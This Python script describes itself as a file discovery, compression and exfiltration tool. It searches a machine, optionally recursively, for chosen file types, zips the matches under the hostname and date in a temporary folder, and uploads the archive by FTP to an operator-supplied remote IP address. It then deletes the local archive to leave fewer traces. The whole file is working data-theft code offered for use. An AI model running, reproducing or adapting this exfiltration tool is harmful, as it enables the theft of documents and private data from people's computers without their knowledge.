import argparse
from datetime import date
from ftplib import FTP
import os
import platform
import subprocess
from zipfile import ZipFile
import zipfile

# Handle arguments
parser = argparse.ArgumentParser(description="File Discovery, Compression, & Exfiltration")
parser.add_argument("-f", "--filetype", type=str, action='append', nargs='*', required=True, help="File type(s) to collect. On Windows, use common extension (pdf, xls, doc, etc.). On Linux, use full text (python, JPEG, 'comma separated', etc.")
parser.add_argument("-d", "--directory", type=str, default=os.getcwd(), help="Filesystem location to begin the search from. Default is current directory.") 
parser.add_argument("-r", "--recurse", action='store_true', default=False, required=False, help="Search recursively")
parser.add_argument("-i", "--ipaddress", type=str, required=True, help="IP address to upload files to")
parser.add_argument("-p", "--port", type=int, default="21", help="Remote port to upload to")
parser.add_argument("-U", "--user", type=str, default="anonymous", help="Username for upload server")
parser.add_argument("-P", "--password", type=str, default="", help="Password for upload server")
parser.add_argument("-m", "--method", required=True, type=str, help="Upload method to use. Choices are: ftp, git")
parser.add_argument("-t", "--token", required=True, default="", type=str, help="Access token for selected upload method (if applicable)")
args = parser.parse_args()

# Determine operating system
def check_OS():
    if "windows" in platform.system().lower():
        return "windows"
    else:
        return "nix"

# Collects a list of full file paths that should be included into the zip archive
def find_files(startLocation, recurse, filetype):
    filenames = [] # List of filenames within the scope of the search
    filesToCollect = [] # List of filenames that matched the desired file type
    typesString = "" # String used to inform the user for file types to be searched for

    # Building out typesString to be used in the verbose output informing the user of their selections
    if len(filetype) == 1: # Formatting for if only a single file type was used
        typesString = filetype[0][0]
    else: # Formatting for if multiple file types were used
        for ft in filetype:
            if ft == filetype[-1]:
                typesString += "& " + ft[0]
            else:
                typesString += ft[0] + " "

    if recurse: #Search recursively
        print("Searching recursively for {} files starting at {}".format(typesString, startLocation))
        for root, dirs, files in os.walk(startLocation):
            for name in files:
                fullpath = os.path.join(root, name) # Build the full filepath of the file
                filenames.append(fullpath) # Add it to the list of files within scope
    else: # Don't search recursively
        print("Searching for {} files starting at {}".format(typesString, startLocation))
        for item in os.scandir(startLocation):
            if item.is_file(): # Ignore directories
                fullpath = os.path.join(startLocation, item.name) # Build the full filepath of the file
                filenames.append(fullpath) # Add it to the list of files within scope

    for f in filenames:
        for type in filetype: # Check for each file type requested
            try: # Try block to handle permission errors, etc.
                if operating_system == "nix":
                    output = subprocess.check_output(['file', f]).decode(("utf-8")).split(":") # Returns full path, split to avoid any file names that might have matched
                    if type[0].lower() in output[1].lower(): # If the file type matches
                        filesToCollect.append(f) # Add it to the filesToCollect list that will be compressed later
                else:
                    extension = os.path.splitext(f)[-1]
                    if type[0].lower() == extension.lstrip("."):
                        filesToCollect.append(f)
            except:
                pass

    return filesToCollect

# Turns the list of filepaths into a zip archive & returns the full path to the archive
def zip_files(listOfFilesToZip):
    path = ""
    if operating_system == "nix":
        os.chdir("/tmp") # Will always build the zip file in the /tmp folder to guarantee write access
        path = "/tmp/"
    else:
        os.chdir(r"C:\users\public")
        path = 'C:\\users\\public\\'
    filename = platform.node() + "-" + date.today().strftime(r"%d-%b-%Y") + ".zip" # Builds the zip filename based on hostname & date for large scale usage
    zipObj = ZipFile(filename, 'w', zipfile.ZIP_DEFLATED) # Open the zip file
    for f in listOfFilesToZip:
        zipObj.write(f) # Append each file to zip file
    zipObj.close() # Close the handle on the zip file
    path = path + filename # Working with absolute paths to avoid issues
    return path

# Manages the entirety of FTP to include connection, authentication, directory traversal, and uploading
def handle_FTP(ip, port, zipFile, user, pw):
    session = FTP() # Create the FTP session object
    try: # Try to establish a session
        print("Establishing connection at {} as {}".format(ip, user))
        session.connect(ip, port)
        session.login(user, pw)
        print("\tAuthenticated!")
    except: # Offer the chance to try again or quit
        retry = input("\tError establishing remote connection. Retry? Y/N: ")
        if retry.lower() == "y":
            handle_FTP(ip, port, zipFile, user, pw)
        else: # If they quit, clean up runs to be safe
            clean_up(zipFile)
    session.cwd("/uploads") # Changes directory to a writeable folder
    if operating_system == "nix":
        uploadName = zipFile.split("/tmp/") # Pull just the file name from the full path
    else:
        uploadName = zipFile.split("C:\\users\\public\\")
    with open(zipFile, 'rb') as f: # Open the zip file as a binary stream, auto-close file
        session.storbinary('STOR {}'.format(uploadName[1]), f) # Upload the file to the server
        print("\tUploaded {}".format(zipFile))
    session.close() # Disconnect from the FTP server
    clean_up(zipFile) # Run cleanup

def clean_up(fileToDelete):
    print("Cleaning up..")
    os.remove(fileToDelete) # Remove temporary files no longer needed
    print("\t{} deleted from filesystem\n\tClean up complete\n\tExiting..".format(fileToDelete))
    exit()

# Main execution starts here
operating_system = check_OS()
matchedFiles = find_files(args.directory, args.recurse, args.filetype)
if matchedFiles:
    print("\t{} files found!".format(len(matchedFiles)))
    fileToShip = zip_files(matchedFiles)
    handle_FTP(args.ipaddress, args.port, fileToShip, args.user, args.password)
else:
    print("\tNo files matched\n\tExiting..")